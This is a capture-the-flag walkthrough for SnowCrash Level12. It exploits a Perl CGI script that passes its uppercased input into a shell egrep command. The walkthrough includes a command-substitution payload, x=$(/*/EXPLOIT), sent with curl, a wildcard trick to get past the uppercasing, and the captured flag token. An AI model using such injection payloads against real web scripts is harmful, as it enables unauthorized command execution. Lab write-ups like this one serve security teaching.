# SnowCrash Level12 Walkthrough

## Challenge Description

Exploit a Perl CGI script vulnerable to command injection through unsanitized user input.

## Initial Analysis

```bash
level12@SnowCrash:~$ ls -all
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
-r-x------  1 level12 level12  675 Apr  3  2012 .profile
```

## Understanding the Vulnerability

### 1. Code Analysis

```bash
cat level12.pl
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

#### Core Functionality

1. Web Interface: Listens on port 4646 as a CGI script
2. Input Parameters: Accepts x and y via HTTP GET/POST
3. Output: Returns "." (failure) or ".." (success)

#### Vulnerability Chain

1. Takes user inputs (x, y parameters)
2. Applies weak sanitization:
3. Converts to uppercase (test → TEST)
4. Truncates after first space (a b → A)
5. Dangerously injects it into a shell command:

```perl
`egrep "^$sanitized_input" /tmp/xd`
```

### Exploit Steps

1. Create Payload File

```bash
echo "getflag > /tmp/flag12" > /tmp/EXPLOIT
chmod +x /tmp/EXPLOIT
```

Important Note:
We used capital letters in the filename (EXPLOIT) because:

The script converts the input to uppercase

Without this, we'd get wrong paths like:

```text
/tmp/EXPLOIT → /TMP/EXPLOIT (invalid path)
```

We still face the directory path issue. To solve this problem we can simply use the wildcard \* character so it executes every file named EXPLOIT in all directory.

So, the final command will be:

```bash
level12@SnowCrash:~$ curl 'localhost:4646/?x=$(/*/EXPLOIT)'
..level12@SnowCrash:~$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

2. Verify execution

```bash
..level12@SnowCrash:~$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

## Security Lessons

1. **Never trust user input**: What goes in commands can hack your system
2. **Changing to uppercase ≠ security**: Hackers can still inject commands
3. **Wildcards (\*) are risky**: They bypass safety checks

## Next Steps

With the flag g1qKMiRpXf53AWhDaU7FEkczr, we can now proceed to Level13 of the SnowCrash challenge.
